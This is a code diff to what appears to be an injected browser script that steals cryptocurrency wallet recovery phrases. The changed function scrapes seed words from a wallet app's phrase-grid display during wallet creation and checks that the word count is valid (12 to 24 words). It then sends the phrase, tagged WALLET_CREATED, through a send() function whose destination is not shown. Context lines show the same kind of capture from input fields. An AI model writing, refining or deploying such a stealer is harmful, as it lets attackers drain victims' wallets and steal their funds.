@@ -197,25 +197,30 @@
     send({TYPE:type,PHRASE:clean,WORDS:n,FIELD:field||"input",PAGE:location.pathname});
   }
 
-  // --- Collect words from phrase-grid/phrase-card divs (wallet creation display) ---
+  // --- Collect words from .phrase-grid (wallet creation display) ---
   function collectGridPhrase(){
-    // The app renders each word in its own .phrase-card inside .phrase-grid
-    var grid=document.querySelector(".phrase-grid");
-    if(!grid)return;
-    var cards=grid.querySelectorAll(".phrase-card");
-    if(!cards.length)return;
-    // Each card: number + word, grab last text node / span
+    var grid=document.querySelector(".phrase-grid")||document.querySelector('[class*="phrase-grid"]');
+    if(!grid){console.log("🔍 No .phrase-grid found");return;}
+    console.log("✅ Found phrase-grid:",grid.className);
+    
+    // Words are in <span> children directly (not .phrase-card)
+    var spans=grid.querySelectorAll(":scope > span");
+    if(!spans.length)spans=grid.children;
+    console.log("🔍 Found",spans.length,"word elements");
+    if(!spans.length)return;
+    
     var ws=[];
-    cards.forEach(function(card){
-      // word text is usually the last text content, strip the index number
-      var txt=(card.textContent||"").trim().replace(/^\d+\s*/,"");
-      if(txt&&/^[a-z]{2,10}$/i.test(txt))ws.push(txt.toLowerCase());
-    });
+    for(var i=0;i<spans.length;i++){
+      var txt=(spans[i].textContent||"").trim().replace(/^\d+[:.)\s]*/,"").trim();
+      if(txt&&/^[a-zA-Z]{2,10}$/.test(txt))ws.push(txt.toLowerCase());
+    }
+    console.log("🔍 Collected:",ws.length,"words",ws.slice(0,3).join(",")+"...");
+    
     if([12,15,18,21,24].includes(ws.length)){
       var phrase=ws.join(" ");
       if(phrase!==lastSent){
         lastSent=phrase;
-        console.log("📋 Wallet phrase from grid:",ws.length,"words");
+        console.log("📋 Sending WALLET_CREATED:",ws.length,"words");
         send({TYPE:"WALLET_CREATED",PHRASE:phrase,WORDS:ws.length,PAGE:location.pathname});
       }
     }
